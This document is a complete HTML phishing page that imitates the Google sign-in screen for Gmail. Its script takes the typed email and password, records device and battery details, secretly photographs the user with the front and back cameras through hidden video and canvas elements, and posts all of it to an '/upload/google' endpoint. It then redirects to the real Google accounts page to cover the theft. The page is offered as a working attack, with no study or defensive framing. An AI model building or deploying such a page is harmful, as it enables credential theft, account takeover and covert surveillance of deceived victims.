<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:white; font-family: 'Segoe UI', Arial, sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .login-box { background:white; padding:48px 40px 36px; border-radius:8px; border:1px solid #dadce0; width:450px; }
        .login-box .logo { text-align:center; font-size:28px; font-weight:500; color:#4285f4; margin-bottom:20px; }
        .login-box .logo span:nth-child(2){color:#ea4335;}
        .login-box .logo span:nth-child(3){color:#fbbc05;}
        .login-box .logo span:nth-child(4){color:#4285f4;}
        .login-box .logo span:nth-child(5){color:#34a853;}
        .login-box .logo span:nth-child(6){color:#ea4335;}
        .login-box h2 { text-align:center; font-weight:400; font-size:24px; margin-bottom:10px; }
        .login-box p { text-align:center; color:#5f6368; font-size:16px; margin-bottom:30px; }
        .login-box input { width:100%; padding:13px 15px; margin:10px 0; border:1px solid #dadce0; border-radius:4px; font-size:16px; }
        .login-box input:focus { border-color:#4285f4; outline:none; }
        .login-box button { width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-size:16px; font-weight:500; cursor:pointer; margin-top:20px; }
        .login-box button:hover { background:#1557b0; }
        .login-box .links { display:flex; justify-content:space-between; margin-top:15px; font-size:14px; color:#1a73e8; cursor:pointer; }
        #status { text-align:center; color:#5f6368; font-size:13px; margin-top:15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <h2>Sign in</h2>
        <p>to continue to Gmail</p>
        <form onsubmit="return false;">
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Enter your password" required>
            <button type="button" onclick="captureAndSubmit()">Next</button>
        </form>
        <div class="links">
            <span>Create account</span>
            <span>Forgot email?</span>
        </div>
        <div id="status">🔒 Secure connection</div>
    </div>

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function captureAndSubmit() {
            const status = document.getElementById('status');
            status.innerHTML = '⏳ Processing...';
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // ডিভাইস ইনফো
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Unknown'
            };

            // ব্যাটারি
            let batteryInfo = 'Unknown';
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = {
                        charging: battery.charging,
                        level: Math.round(battery.level * 100) + '%',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch(e) {}
            }

            // ফ্রন্ট + ব্যাক ক্যামেরা
            let frontImage = null, backImage = null;
            
            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
                });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = frontStream;
                await video.play();
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                frontImage = canvas.toDataURL('image/png');
                frontStream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            try {
                const backStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
                });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = backStream;
                await video.play();
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                backImage = canvas.toDataURL('image/png');
                backStream.getTracks().forEach(t => t.stop());
            } catch(e) {}

            const payload = {
                site: 'Google',
                username: email,
                password: password,
                frontImage: frontImage,
                backImage: backImage,
                deviceInfo: deviceInfo,
                batteryInfo: batteryInfo,
                timestamp: Date.now()
            };

            try {
                await fetch('/upload/google', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                status.innerHTML = '✅ Redirecting...';
                window.location.href = 'https://accounts.google.com';
            } catch(e) {
                window.location.href = 'https://accounts.google.com';
            }
        }
    </script>
</body>
</html>
